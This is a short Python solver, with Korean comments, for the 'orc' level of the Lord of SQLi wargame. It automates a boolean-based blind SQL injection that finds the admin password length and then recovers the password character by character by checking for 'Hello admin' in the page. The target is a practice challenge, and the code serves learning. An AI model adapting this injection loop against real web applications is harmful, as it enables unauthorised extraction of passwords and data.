import os
from dotenv import load_dotenv
import requests
from tqdm import tqdm

# 상위 디렉토리의 .env 파일 경로
dotenv_path = os.path.join(os.path.dirname(__file__), '..', '.env')

# .env 파일 로드
load_dotenv(dotenv_path)

# 환경변수 가져오기
my_cookie ={ "PHPSESSID" : os.getenv('MY_COOKIE') }
            

#print(my_cookie)

URL = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
param = ""
chars = "0123456789abcdefghijklmnopqrstuvwxyz!@"
len = 0
# 1. 길이 구하기
res = requests.get(URL, cookies=my_cookie)
    
for i in tqdm(range(100)):
    params = f"%27 or LENGTH(pw)>{i}%23"
    # print(params)
    res = requests.get(URL+params, cookies=my_cookie)
    if "Hello admin" in res.text :
        continue
    else :
        len = i
        break
    
print("length : ", len  )

#2. 비밀번호 구하기
ans = ""
for i in tqdm(range(1,len+1)):
    # print("i : ",i)
    for j in chars :
        param = f'%27%20or%20substr(pw,{i},1)%20=%27{j}'
        res = requests.get(URL+param, cookies=my_cookie)
        # print(param)
        if "Hello admin" in res.text :
            ans += j
            break

print("answer :",ans)